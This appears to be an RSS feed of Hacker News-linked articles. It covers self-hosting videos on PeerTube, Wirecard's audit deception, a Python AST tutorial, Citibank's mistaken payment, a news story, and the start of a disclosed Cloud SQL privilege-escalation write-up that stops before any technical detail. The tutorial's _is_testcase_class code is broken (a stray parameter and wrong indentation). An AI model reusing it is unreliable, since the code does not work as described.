<p>Back when I first started posting videos, I used Vimeo. Even though YouTube was the dominant video site, I wanted to support the underdog. I even bought a Vimeo Pro account. At the time, Vimeo had higher quality video than YouTube, but nowhere near the level of discoverability. Eventually I started posting on YouTube; both new content and some reposts of my older videos. It’s 2020 and YouTube, as well as the rest of big tech, is continuing to <a href="https://battlepenguin.com/politics/twitter-is-trying-to-erase-the-past/">remove content</a> they don’t agree with from their platforms. None of <a href="https://battlepenguin.com/videos/">my videos</a> have ever gotten a large number of views, and none are monetized, so I might as well copy them to a PeerTube instance I control. If you do run a YouTube channel with any type of significant viewership, I highly recommend backing up your videos, in the event you may need to self-host your content in the future.</p>

<!--more-->

<p>I’m not rehosting everything I’ve posted on Vimeo or YouTube. I’m starting with all the videos that are featured on <a href="https://battlepenguin.com/tech/a-history-of-personal-and-professional-websites/">my website</a>, so I can replace the embedded clips, and point them to my self-hosted PeerTube instance on <a href="https://battlepenguin.video/">battlepenguin.video</a>. I’m keeping links to other video platforms in the video descriptions and in my own blog posts. I’m not changing any of the descriptions for existing videos, but newer uploads to YouTube will have a link to my PeerTube mirror.</p>

<figure>
  
  <img src="https://battlepenguin.com/images/tech/peertube/ip-addr-screen.png" alt="Warning on a PeerTube video embed about IP sharing">
  
  
  <figcaption>
      
         <a href="https://battlepenguin.com/tech/video/upgrading-the-ssd-on-an-msi-gs60-laptop/">
      

      Warning on a PeerTube video embed about IP sharing

      
         </a>
      
  </figcaption>
  
</figure>

<p>An embedded PeerTube video comes with a warning, because when you watch one of these videos using the web player, you may also be serving that video to other audience members watching it at the same time. PeerTube does this using technologies such as WebTorrent and WebRTC. In theory, this can help PeerTube scale without expensive centralized servers. As a video becomes more popular, other viewers use their web browsers and Internet connections to help distribute the content they’re consuming. This is one of the trade-offs between privacy and decentralization.</p>

<p>PeerTube can also communicate to other servers via ActivityPub, allowing people to subscribe to a video channel from other PeerTube instances, or other servers running Mastodon, Pleroma or other ActivityPub compatible software.</p>

<h3 id="subtitles">Subtitles</h3>

<p>YouTube has a feature where you can upload a text document of a video transcription and YouTube will attempt to automatically time-code that text as subtitles. It’s important to write out transcripts whenever you can, to make content accessible for those with hearing disabilities. PeerTube supports subtitles in both the VTT and SRT. YouTube allows creators to download subtitles in several formats, or the <a href="https://youtube-dl.org/">youtube-dl</a> application can be used to download subtitles from videos using the option <code>--all-subs</code> as seen below.</p>

<pre>youtube-dl --all-subs --skip-download 'https://www.youtube.com/watch?v=&lt;video_id&gt;'
</pre>

<figure>
  
  <img src="https://battlepenguin.com/images/tech/peertube/yt-subtitles.png" alt="Download Subtitles through the YouTube Web Interface">
  
  
  <figcaption>
      

      Download Subtitles through the YouTube Web Interface

      
  </figcaption>
  
</figure>

<h3 id="hosting-with-docker">Hosting with Docker</h3>

<p>I use the official PeerTube container published by chocobozzz. It’s provisioned using my custom Docker tool, <a href="https://github.com/sumdog/bee2">Bee2</a>. I adapted it from the project’s <a href="https://github.com/Chocobozzz/PeerTube/tree/develop/support/docker/production">example docker-compose file</a>. The example doesn’t contain all the configuration options that can be set, but you can find the others in the <a href="https://github.com/Chocobozzz/PeerTube/blob/develop/support/docker/production/config/custom-environment-variables.yaml">custom-environment-variables.yaml</a> schema file.</p>

<pre>...
peertube:
  image: chocobozzz/peertube:v2.2.0-buster
  networks:
    - public
    - database
  traefik:
    http:
      hosts:
        - battlepenguin.video
      tls: enabled
      port: 9000
  labels:
    lb.net: public
  env:
    PEERTUBE_REDIS_HOSTNAME: $peertube-redis
    PEERTUBE_DB_USERNAME: peertube
    PEERTUBE_DB_PASSWORD: _postgres^password
    POSTGRES_DB: peertube
    PEERTUBE_DB_HOSTNAME: $postgres
    PEERTUBE_WEBSERVER_HOSTNAME: battlepenguin.video
    PEERTUBE_SMTP_USERNAME: ****
    PEERTUBE_SMTP_PASSWORD: ****
    PEERTUBE_SMTP_HOSTNAME: ****
    PEERTUBE_SMTP_PORT: ****
    PEERTUBE_SMTP_TLS: true
    PEERTUBE_SMTP_FROM: ****
    PEERTUBE_ADMIN_EMAIL: ****
    PEERTUBE_SIGNUP_ENABLED: false
    PEERTUBE_TRANSCODING_ENABLED: true
    PEERTUBE_CONTACT_FORM_ENABLED: true
    PEERTUBE_INSTANCE_NAME: "BattlePenguin Studios"
    PEERTUBE_INSTANCE_DESCRIPTION: "Videos for BattlePenguin.com"
  volumes:
    - peertube_data:/data:rw
    - peertube_config:/config:rw
  db:
    - postgres
peertube-redis:
  networks:
    - database
  image: redis:6.0.5-alpine
  volumes:
    - peertube-redis:/data
...
</pre>

<h3 id="promotion">Promotion</h3>

<p>Since I’m still uploading videos to YouTube, there is the question of which video do I promote? Do I use a YouTube link, or a PeerTube link? I’ve been doing a mix of the two for recent videos, splitting the difference between various social media platforms. Linking to YouTube helps feed their algorithms and can help generate greater viewership outside of my sphere of influence, but it does direct more traffic towards Google services instead of my own server. I don’t post a lot of videos, my viewership is small and I don’t have any big stakes in the attention economy, so I’ll probably be experimenting with both forms of promotion for the foreseeable future.</p>

<h3 id="the-big-dogs">The Big Dogs</h3>

<p>There are some big channels that make a large chunk of of their income from YouTube ads, with other coming from paid promotion, <a href="https://www.patreon.com/bePatron?u=4777528">fan support</a> and merchandise. Besides the obvious costs of time investment and hosting, mirroring content outside of YouTube might eat up a non-trivial amount of advertising income. It makes more sense for someone just starting out to host their own content, than a creator who is entrenched in the YouTube world.</p>

<p>However, self-hosting might also be the only alternative, if Google decides to ban you from their platform. Content creators should have backups, and have plans ready to go, in the event their content is deemed to no longer be acceptable by YouTube. If you don’t have original copies if all your videos, <code>youtube-dl</code> can be used to download entire channels. PeerTube is just one of many open source tools that content creators should look at and evaluate, in order to prepare for a time when your channel, or YouTube as a whole, disappears.</p>


    

  </article>

</section>



    </div></div>]]>
            </description>
            <link>https://battlepenguin.com/tech/moving-from-youtube-to-peertube/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24222661</guid>
            <pubDate>Thu, 20 Aug 2020 12:48:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fintech Wirecard hired actors to fool auditors]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 80 (<a href="https://news.ycombinator.com/item?id=24222629">thread link</a>) | @ramboldio
<br/>
August 20, 2020 | https://www.manager-magazin.de/unternehmen/wirecard-jan-marsalek-soll-wirtschaftspruefer-ey-mit-schauspielern-getaeuscht-haben-a-00000000-0002-0001-0000-000172590382 | <a href="https://web.archive.org/web/*/https://www.manager-magazin.de/unternehmen/wirecard-jan-marsalek-soll-wirtschaftspruefer-ey-mit-schauspielern-getaeuscht-haben-a-00000000-0002-0001-0000-000172590382">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Zwischen Anfang Januar und Ende April war <strong>Jan Marsalek</strong> (40) besonders gefordert. Kolonnen von Wirtschaftsprüfern marschierten in die Zentrale des Zahlungsdienstleisters Wirecard in Aschheim bei München. Chief Operating Officer Marsalek musste alles tun, um die Mär vom wachstumsstarken und ertragreichen Börsenstar und Dax-Mitglied fortzuspinnen.</p><div>
<p>Wie weit der Österreicher bei seinen Inszenierungen zu gehen bereit war, ist im bislang unveröffentlichten Anhang des Sonderberichts der forensischen Ermittler von KPMG nachzulesen, der manager magazin vorliegt. Zugleich zeigen interne Untersuchungen von EY, wie sich die Wirtschaftsprüfer lange Jahre von Marsalek übertölpeln ließen.</p><p>Aufgebaut war das Illusionstheater rund um die 1,9 Milliarden Euro, die Wirecard angeblich auf Treuhandkonten bei zwei philippinischen Banken deponiert hatte. KPMG berichtet, dass ihren Sonderprüfern die Existenz der Konten sowie die Höhe der eingelegten Summen Anfang März bei einem Besuch in den Niederlassungen der BDO Unibank und der Bank of the Philippine Islands mündlich bestätigt wurde.</p>
</div></div>]]>
            </description>
            <link>https://www.manager-magazin.de/unternehmen/wirecard-jan-marsalek-soll-wirtschaftspruefer-ey-mit-schauspielern-getaeuscht-haben-a-00000000-0002-0001-0000-000172590382</link>
            <guid isPermaLink="false">hacker-news-small-sites-24222629</guid>
            <pubDate>Thu, 20 Aug 2020 12:44:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analyzing Python Code with Python]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24222186">thread link</a>) | @rbanffy
<br/>
August 20, 2020 | https://rotemtam.com/2020/08/13/python-ast/ | <a href="https://web.archive.org/web/*/https://rotemtam.com/2020/08/13/python-ast/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <header>

      <h3>
        <ul>
          <li>
            <a href="https://rotemtam.com/archive">archive</a> | &nbsp;
          </li>
          <li>
            <a href="https://rotemtam.com/about">about</a>
          </li>
        </ul>
        <a href="https://rotemtam.com/" title="Home">placeholder</a>

        <p><small>thoughts and learnings in software engineering by Rotem Tamir</small></p>


      </h3>
    </header>

    <main>
      <article>
  
  <time datetime="2020-08-13T00:00:00+00:00">13 Aug 2020</time>
  <h3 id="a-first-dip-into-diy-static-code-analysis">A first dip into DIY static code analysis</h3>

<p>One of the special things about software engineering as a profession is the possibility of <em>ars-poetic</em> work: part of our work is building tools that target our own work; perhaps a few surgeons around the globe can design and meld their own scalpel, but for software engineers building our own tooling is a day to day reality.</p>

<p>Recently, I’ve been working on migrating a large repository of code to be built with Bazel.  To do this properly I had to generate well over a hundred different BUILD files.  Doing so by hand would have been slow, error-prone and exhausting, so instead I opted to write a tool that would do this automatically for me.</p>

<p>When describing a BUILD module for Bazel, each test file must be defined as a <code>*_test</code> rule, which explicitly defines any dependencies it has. For example, in order to get Bazel to run a python test, one would write something similar to:</p>

<div><div><pre><code><span>py_test</span><span>(</span>
    <span>name</span> <span>=</span> <span>"test_context"</span><span>,</span>
    <span>srcs</span> <span>=</span> <span>[</span><span>"test_context.py"</span><span>],</span>
    <span>main</span> <span>=</span> <span>"test_context.py"</span><span>,</span>
    <span>tags</span> <span>=</span> <span>[],</span>
    <span>deps</span> <span>=</span> <span>[</span>
        <span>":context"</span><span>,</span>
        <span>"//libs/config"</span><span>,</span>
    <span>],</span>
<span>)</span>
</code></pre></div></div>

<p>The first step to writing a program that will generate this block for each test file in our repository is to figure out which of the files in our repository <em>are test files.</em> In the context of the repository I was working on a test file could be defined as:</p>

<ol>
  <li>The file has a <code>*.py</code> suffix</li>
  <li>The file contains a class which inherits from <code>unittest.TestCase</code></li>
  <li>The class contains at least one method who’s name begins with <code>test_</code></li>
</ol>

<h3 id="using-asts-for-fun-and-profit">Using ASTs for Fun and Profit</h3>

<p>Sounds simple enough, surely something we can do with some regular expressions, right? Well, we could, but there are <em>a lot</em> of edge cases to consider, and wouldn’t it be great if we could see our code the same way the Python interpreter sees it?</p>

<p>Turns out there’s an easy way to do that, the Python standard library contains a neat little package named <code>ast</code> - shorthand for Abstract Syntax Tree. <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">Wikipedia</a> defines ASTs as:</p>

<blockquote>
  <p>In computer science, an abstract syntax tree (AST), or just syntax tree, is a tree representation of the abstract syntactic structure of source code written in a programming language. Each node of the tree denotes a construct occurring in the source code.</p>
</blockquote>

<p>and the <code>ast</code> <a href="https://docs.python.org/3/library/ast.html">package documentation</a> describes it as:</p>

<blockquote>
  <p>The ast module helps Python applications to process trees of the Python abstract syntax grammar. The abstract syntax itself might change with each Python release; this module helps to find out programmatically what the current grammar looks like.</p>
</blockquote>

<p>In software engineering, the practice of building programs that analyze another program’s source code without actually executing it is called <em>static code analysis.</em> By using an AST parser for the language we are interested in, we transform that source code into data that we can process just like any other. Using the Python standard-library’s <code>ast</code> package, we can parse a block of python code into a data structure which we can traverse and analyze.  This will be very handy in answering whether a file contains a unit test!</p>

<h3 id="finding-all-test-files-in-the-repo">Finding all test files in the repo</h3>

<p>The first step, is walking the filesystem to find all candidate files:</p>

<div><div><pre><code><span>import</span> <span>os</span>

<span>def</span> <span>is_test_file</span><span>(</span><span>path</span><span>)</span> <span>-&gt;</span> <span>bool</span><span>:</span>
	<span># TODO: impl
</span>	<span>pass</span>

<span>def</span> <span>find_test_files</span><span>(</span><span>repo_root</span><span>):</span>
	<span>test_files</span> <span>=</span> <span>[]</span>
	<span>for</span> <span>root</span><span>,</span> <span>dirs</span><span>,</span> <span>files</span> <span>in</span> <span>os</span><span>.</span><span>walk</span><span>(</span><span>repo_root</span><span>):</span>
		<span>for</span> <span>file</span> <span>in</span> <span>files</span><span>:</span>
			<span>if</span> <span>not</span> <span>file</span><span>.</span><span>endswith</span><span>(</span><span>".py"</span><span>):</span>
				<span>continue</span>
			<span>path</span> <span>=</span> <span>os</span><span>.</span><span>path</span><span>.</span><span>join</span><span>(</span><span>root</span><span>,</span> <span>file</span><span>)</span>
			<span>if</span> <span>is_test_file</span><span>(</span><span>path</span><span>):</span>
				<span>test_files</span><span>.</span><span>append</span><span>(</span><span>path</span><span>)</span>
	<span>return</span> <span>test_files</span>
</code></pre></div></div>

<p>Next, let’s see what we can do with <code>ast</code>.</p>

<div><div><pre><code><span>Python</span> <span>3.7.7</span> <span>(</span><span>default</span><span>,</span> <span>Jul</span> <span>15</span> <span>2020</span><span>,</span> <span>21</span><span>:</span><span>51</span><span>:</span><span>02</span><span>)</span>
<span>[</span><span>Clang</span> <span>10.0.1</span> <span>(</span><span>clang</span><span>-</span><span>1001.0.46.4</span><span>)]</span> <span>on</span> <span>darwin</span>
<span>Type</span> <span>"help"</span><span>,</span> <span>"copyright"</span><span>,</span> <span>"credits"</span> <span>or</span> <span>"license"</span> <span>for</span> <span>more</span> <span>information</span><span>.</span>
<span>&gt;&gt;&gt;</span> <span>source</span> <span>=</span> <span>"""
... class Test(unittest.TestCase):
...   def test_hello(self):
...     pass
... """</span>
<span>&gt;&gt;&gt;</span> <span>import</span> <span>ast</span>
<span>&gt;&gt;&gt;</span> <span>tree</span> <span>=</span> <span>ast</span><span>.</span><span>parse</span><span>(</span><span>source</span><span>)</span>
<span>&gt;&gt;&gt;</span> <span>print</span><span>(</span><span>tree</span><span>)</span>
<span>&lt;</span><span>_ast</span><span>.</span><span>Module</span> <span>object</span> <span>at</span> <span>0x10379c6d0</span><span>&gt;</span>
</code></pre></div></div>

<p>Using <a href="https://vpyast.appspot.com/">this neat visualizer</a>, this is what the python AST looks like:</p>

<figure>
    <img src="https://rotemtam.com/assets/ast-viz.png" alt="">
    <figcaption></figcaption>
  </figure>

<p>So when parsing a block of source code with <code>ast.parse</code> we get back a tree-like data structure that has:</p>

<ul>
  <li><code>Module</code> at its root</li>
  <li>With a <code>body</code> attribute which is a list of elements</li>
  <li>In our file there is only one element a <code>ClassDef</code> object with a <code>name</code> of <code>Test</code></li>
  <li>This <code>ClassDef</code> has two attributes, <code>body</code> and <code>bases</code></li>
  <li><code>body</code> has a single <code>FunctionDef</code> (our test method definition) which has a name of <code>test_hello</code></li>
  <li><code>bases</code> is a list of base-classes our <code>ClassDef</code> inherits from, in our case, something that if we squint a little we can see is <code>unittest.TestCase</code></li>
</ul>

<p>Great, there’s everything we need in here to make our decision. Our final method will look like:</p>

<div><div><pre><code><span>import</span> <span>ast</span>

<span>def</span> <span>is_test_file</span><span>(</span><span>abspath</span><span>)</span> <span>-&gt;</span> <span>bool</span><span>:</span>
  <span>with</span> <span>open</span><span>(</span><span>abspath</span><span>,</span> <span>"r"</span><span>)</span> <span>as</span> <span>f</span><span>:</span>
      <span>data</span> <span>=</span> <span>f</span><span>.</span><span>read</span><span>()</span>
  <span>source_ast</span> <span>=</span> <span>ast</span><span>.</span><span>parse</span><span>(</span><span>data</span><span>)</span>

  <span>for</span> <span>node</span> <span>in</span> <span>source_ast</span><span>.</span><span>body</span><span>:</span>
    <span>if</span> <span>isinstance</span><span>(</span><span>node</span><span>,</span> <span>ast</span><span>.</span><span>ClassDef</span><span>)</span> <span>and</span> <span>_is_testcase_class</span><span>(</span><span>node</span><span>):</span>
        <span>for</span> <span>class_node</span> <span>in</span> <span>node</span><span>.</span><span>body</span><span>:</span>
            <span>if</span> <span>isinstance</span><span>(</span><span>class_node</span><span>,</span> <span>ast</span><span>.</span><span>FunctionDef</span><span>)</span> <span>and</span> <span>class_node</span><span>.</span><span>name</span><span>.</span><span>startswith</span><span>(</span><span>"test_"</span><span>):</span>
                <span>return</span> <span>True</span>
	  <span>return</span> <span>False</span>

<span>def</span> <span>_is_testcase_class</span><span>(</span><span>self</span><span>,</span> <span>classdef</span><span>:</span> <span>ast</span><span>.</span><span>ClassDef</span><span>)</span> <span>-&gt;</span> <span>bool</span><span>:</span>
  <span>for</span> <span>base_class</span> <span>in</span> <span>classdef</span><span>.</span><span>bases</span><span>:</span>
				
  <span># if the test class looks like class Test(TestCase)
</span>  <span>if</span> <span>isinstance</span><span>(</span><span>base_class</span><span>,</span> <span>ast</span><span>.</span><span>Name</span><span>):</span>
      <span>base_name</span> <span>=</span> <span>base_class</span><span>.</span><span>id</span>

  <span># if the test class looks like class Test(unittest.TestCase):
</span>  <span>elif</span> <span>isinstance</span><span>(</span><span>base_class</span><span>,</span> <span>ast</span><span>.</span><span>Attribute</span><span>):</span>
      <span>base_name</span> <span>=</span> <span>base_class</span><span>.</span><span>attr</span>
  <span>else</span><span>:</span>
      <span>continue</span>
  <span>if</span> <span>base_name</span> <span>==</span> <span>'TestCase'</span><span>:</span>
      <span>return</span> <span>True</span>
  <span>return</span> <span>False</span>
</code></pre></div></div>

<p>In short:</p>

<ul>
  <li>We read the source file into a string, then parse it with <code>ast.parse</code></li>
  <li>We then scan the module’s body looking for <code>ast.ClassDef</code> (class definition) nodes.</li>
  <li>If we find one, we check whether it inherits from <code>unittest.TestCase</code> by looking at the class definition’s <code>bases</code> attribute.</li>
  <li>If we find a TestCase class we iterate through that ClassDef’s <code>body</code> looking for a <code>FunctionDef</code> whos’ name begins with <code>test_</code></li>
</ul>

<h3 id="conclusion">Conclusion</h3>

<p>Sure, we probably could have gotten OK results using a shell script with some heuristic-based regular expressions, but using AST’s to parse the source code <em>as the interpreter sees it</em> we can get definitive answers that are robust to any edge cases such as odd formatting and placing code inside comments or strings. Being able to create the tools to make your job easier is one of the best things about being a software engineer, being able to programmatically parse and analyze your own source code takes your tool building possibilities to the next level!</p>

</article>





    </main>

    
  </div></div>]]>
            </description>
            <link>https://rotemtam.com/2020/08/13/python-ast/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24222186</guid>
            <pubDate>Thu, 20 Aug 2020 11:38:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Citibank's $900M Blunder]]>
            </title>
            <description>
<![CDATA[
Score 227 | Comments 206 (<a href="https://news.ycombinator.com/item?id=24222045">thread link</a>) | @superasn
<br/>
August 20, 2020 | https://finshots.in/archive/citibank-billion-dollar-blunder/ | <a href="https://web.archive.org/web/*/https://finshots.in/archive/citibank-billion-dollar-blunder/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">

    <div>

        <article>

            

            <figure>
                <img srcset="https://d3jlwjv6gmyigl.cloudfront.net/images/2020/08/citi2.jpg 300w,
                            https://d3jlwjv6gmyigl.cloudfront.net/images/2020/08/citi2.jpg 600w,
                            https://d3jlwjv6gmyigl.cloudfront.net/images/2020/08/citi2.jpg 1000w,
                            https://d3jlwjv6gmyigl.cloudfront.net/images/2020/08/citi2.jpg 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://d3jlwjv6gmyigl.cloudfront.net/images/2020/08/citi2.jpg" alt="Citibank's $900 Million Blunder">
            </figure>

            <section>
                <div>
                    <p><em>What happens when you accidentally transfer ~$900 million to somebody you didn’t mean to?</em></p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="the-cast">The Cast</h3><p>Revlon is a multinational American Cosmetics company.</p><p>Citibank is a bank.</p><p>Brigade Capital is a hedge fund.</p><p>And a few days back, all three actors were involved in a dramatic sequence of events that can be best described as “comical”. The only problem — it’s not.</p><h3 id="the-story">The Story</h3><p>Revlon was expected to transfer a few million dollars to some of its lenders. Citibank was expected to facilitate this transfer. Unfortunately, somebody in Citibank goofed up. Instead of sending the money from Revlon’s account, Citi transferred $900 million to a group of lenders from its own account. Citibank quickly realised the mistake. They apologised (I think) and asked the lenders to return the money. Some of them agreed. Some of them weren’t all too enthusiastic about parting with their newfound riches. Brigade Capital, one of the biggest beneficiaries flat out refused to even consider Citi’s request.</p><p>At this point, you’re probably thinking — Finders Keepers. But alas, playground rules don’t apply in the real world. It’s all very very complicated.</p><h3 id="the-principle-of-unjust-enrichment">The principle of Unjust Enrichment</h3><p>In contract law, unjust enrichment happens when there’s an enrichment of one party at the expense of another in circumstances that the law sees as unjust. It can happen for instance when someone pays money to another individual under the mistaken belief he is liable to pay the amount. And in the event, such a transaction does transpire, the law imposes an obligation upon the recipient to pay back the money in full.</p><p>The application of this principle is illustrated in a popular case from English Common Law — <a href="https://en.wikipedia.org/wiki/Kelly_v_Solari" rel="noopener"><em>Kelly v Solari</em></a><em>.</em></p><p>The matter was regarding a life insurance policy. Mr. Solari had passed away. His widow claimed £200 from the insurance provider upon his death. The claim was paid in full. But soon enough, the insurers found out that the policy had lapsed before the death of Mr. Solari. They realised they weren’t liable to pay because Mr. Solari had missed a premium installment.</p><p>And the judges agreed. They <a href="https://swarb.co.uk/kelly-v-solari-cexc-1841/">noted</a> —</p><blockquote><em>Where money is paid to another under the influence of a mistake in circumstances where if the true facts had been known the money would not have been paid, an action lies to recover the money and it is against the conscience of the recipient to retain it.</em></blockquote><p>Mrs. Solari had to return the money even though she wasn’t in the wrong here. So one could contest that Citibank is entitled to receive its money. However, there is a tiny complication here. Although the bank contests the transaction was a clerical error, Revlon was, in fact, liable to pay the money to Brigade Capital.</p><h3 id="the-logic">The Logic</h3><p>In 2016, Revlon acquired Elizabeth Arden, an American Cosmetics brand. Brigade Capital financed part of the $1.8 billion loan deal Revlon used to buy the company. As the administrator of the gargantuan arrangement, it was incumbent on Citibank to collect payments from Revlon and transfer it to the lenders, including Brigade Capital. The company was expected to transfer $1.5 million in interest payments to the hedge fund a few days back. Instead, they sent $176.2 mn from their own account — a sum totalling all the accrued interest and the principal in full.</p><p>Brigade contests that this is simply a prepayment. A loan that was paid before it was due. How can it be a mistake when Citibank transferred the exact amount outstanding under the original credit agreement? What kind of mistake is that?</p><p>Citibank offers a counter. Their first line of defence is Revlon’s <a href="https://theprint.in/economy/citigroup-accidentally-wired-900-million-to-revlon-lenders-now-its-fighting-to-get-it-back/482438/">own statement </a>—<em> “Revlon did not pay down the loan or any part of the loan”</em>. That’s what a representative from Revlon had to say when asked about the matter. Besides Revlon did not have this kind of money in their own account. The company is struggling financially. It’s also one of the reasons Brigade does not want to return the money. They don’t think Revlon will be able to honour its obligations. They think Revlon is bound to default soon enough.</p><p>For Citibank, this is a potential defence. It said and <a href="https://edition.cnn.com/2020/08/18/investing/citibank-sues-brigade-capital/index.html">we quote</a> — “<em>Virtually no company, let alone a distressed retail and consumer company such as Revlon, would ever make such a substantial prepayment while dealing with the significant financial consequences caused by the ongoing pandemic.”</em></p><p>Ergo, it must be a mistake. But since Brigade refused to cooperate, Citigroup sued the company in a Federal Court and tried to force its hand.</p><p>The judge saw merit in Citi’s argument. The company was offered temporary relief after the judge granted Citigroup’s request to freeze roughly <a href="https://www.wsj.com/articles/citi-sues-revlon-lender-brigade-seeks-return-of-mistaken-payment-11597694604" rel="noopener">$175 million</a> the bank paid the hedge fund. So, for now, Brigade can’t withdraw, transfer or dispose of the money, until the court can hear both sides and rule on the matter.</p><p>Is it a mistake?</p><p>Is it not?</p><p>That is, quite literally, the million-dollar question.</p><p>What do you think?</p><p>Share this Finshots on <a href="https://api.whatsapp.com/send?text=An%20explainer%20on%20Citi%27s%20$1%20billion%20blunder.%20https://bit.ly/34i6Zx0">WhatsApp</a>, <a href="https://twitter.com/intent/tweet?url=https://bit.ly/34gLKMe&amp;via=finshots&amp;text=An%20explainer%20on%20Citi%27s%20$1%20billion%20blunder.">Twitter</a>, or <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://finshots.in/archive/citibank-billion-dollar-blunder">LinkedIn</a>.</p>
                </div>
            </section>


            

            

            


        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://finshots.in/archive/citibank-billion-dollar-blunder/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24222045</guid>
            <pubDate>Thu, 20 Aug 2020 11:17:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Madhya Pradesh man cycles 105km to ferry son to Class X exam centre]]>
            </title>
            <description>
<![CDATA[
Score 129 | Comments 92 (<a href="https://news.ycombinator.com/item?id=24219682">thread link</a>) | @throw93
<br/>
August 19, 2020 | https://www.theweek.in/news/india/2020/08/19/madhya-pradesh-man-cycles-105km-to-ferry-son-to-class-x-exam-centre.html | <a href="https://web.archive.org/web/*/https://www.theweek.in/news/india/2020/08/19/madhya-pradesh-man-cycles-105km-to-ferry-son-to-class-x-exam-centre.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-pagination-init="article">

    <div><p>In absence of public transport, a 38-year-old man travelled 105 km on a bicycle carrying his son to ensure he does not miss Class X board's supplementary exam in Dhar of Madhya Pradesh.</p>
<p>Though Shobhram, who paddled the cycle, is himself unlettered, he said he understands the importance of education and did not want his son to waste one year by missing the supplementary paper.</p>
<p>Therefore, he decided to undertake the arduous journey, with his son on the cycle's rear seat, from his village Baydipur in Dhar district's Manawar tehsil to reach the exam centre on time.</p>
<p>With no public transport available due to the COVID-19 lockdown and hardly any money, Shobhram decided to take his son on a bicycle to Dhar town, some 105km away, so that he can appear in Class X boards supplementary exam conducted under the Madhya Pradesh government's 'Ruk Jana Nahin' scheme.</p>
<p>The scheme gives an opportunity to students to clear those subjects which they were unable to pass in the first attempt.</p>
<p>“No means of transport, including bus, were available due to the prevailing coronavirus situation. But if I had missed this opportunity, then my son's one year would have gone waste. Therefore, I decided to take him for the examination on a bicycle,” Shobhram told PTI on Wednesday.</p>
<p>"Besides, we don't have money or even a motorcycle. Nobody helps. But for improving my son's life, I brought him to Dhar for appearing in the examination on bicycle," he said.</p>
<p>"We carried food and other eatables with us for sustaining ourselves in Dhar for two-three days. We started on Monday and after spending a few hours of night at Manawar town, we reached Dhar on Tuesday morning just before start of the exam," he said.</p>
<p>The boy, Ashish, aged around 15, said, "I am studying in Class X and I came here on cycle with my father for appearing in the examination."</p>
<p>Ashish appeared in the examination held at the Government Bhoj Girls School in Dhar town.</p>
<p>Meanwhile, taking cognizance of their plight, the Dhar district administration made arrangements for their stay and food in a tribal hostel till August 24, tribal development departments assistant commissioner Brajesh Kumar Pandey said.</p>
<p>The department will also make arrangements for their return journey and not allow them to go back home on their bicycle, he added.</p>
<p>Former Madhya Pradesh chief minister Kamal Nath, while praising the efforts of Shobhram, demanded that the state government make transport arrangements for students appearing in examinations under the 'Ruk Jana Nahi' scheme.</p>
<div><p>In a tweet in Hindi, the Congress leader said, “I salute the courage of Shobhram who cycled for 105km to ensure that his son appears in the 10th board examination.”</p></div>

        
        
    </div>
</div></div>]]>
            </description>
            <link>https://www.theweek.in/news/india/2020/08/19/madhya-pradesh-man-cycles-105km-to-ferry-son-to-class-x-exam-centre.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24219682</guid>
            <pubDate>Thu, 20 Aug 2020 03:47:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to contact Google SRE by dropping a shell in Cloud SQL]]>
            </title>
            <description>
<![CDATA[
Score 584 | Comments 80 (<a href="https://news.ycombinator.com/item?id=24216009">thread link</a>) | @fanf2
<br/>
August 19, 2020 | https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/ | <a href="https://web.archive.org/web/*/https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
		
<p><strong><span color="red">Note</span></strong>: The vulnerabilities that are discussed in this post were patched quickly and properly by Google. We support responsible disclosure. The research that resulted in this post was done by me and my bughunting friend Ezequiel Pereira. You can read this same post on his <a href="https://www.ezequiel.tech/2020/08/dropping-shell-in.html">website</a></p>



<p><a href="https://twitter.com/wtm_offensi?ref_src=twsrc%5Etfw" data-size="large" data-dnt="true" data-show-count="false">Follow wtm</a></p><h3>About Cloud SQL</h3>



<p>Google Cloud SQL is a fully managed relational database service. Customers can deploy a SQL, PostgreSQL or MySQL server which is secured, monitored and updated by Google. More demanding users can easily scale, replicate or configure high-availability. By doing so users can focus on working with the database, instead of dealing with all the previously mentioned complex tasks. Cloud SQL databases are accessible by using the applicable command line utilities or from any application hosted around the world. This write-up covers vulnerabilities that we have discovered in the MySQL versions 5.6 and 5.7 of Cloud SQL.</p>







<h4>Limitations of a managed MySQL instance</h4>



<p>Because Cloud SQL is a fully managed service, users don’t have access to certain features. In particular, the SUPER and FILE privilege. In MySQL, the SUPER privilege is reserved for system administration related tasks and the FILE privilege for reading/writing to and from files on the server running the MySQL daemon. Any attacker who can get a hold of these privileges can easily compromise the server.&nbsp;</p>



<p>Furthermore, mysqld port 3306 is not reachable from the public internet by default due to firewalling. When a user connects to MySQL using the gcloud client (‘gcloud sql connect &lt;instance&gt;’), the user’s ip address is temporarily added to the whitelist of hosts that are allowed to connect.&nbsp;</p>



<p>Users do get access to the ‘root’@’%’ account. In MySQL users are defined by a username AND hostname. In this case the user ‘root’ can connect from any host (‘%’).&nbsp;</p>







<h3>Elevating privileges</h3>



<h4>Bug 1. Obtaining FILE privileges through SQL injection</h4>



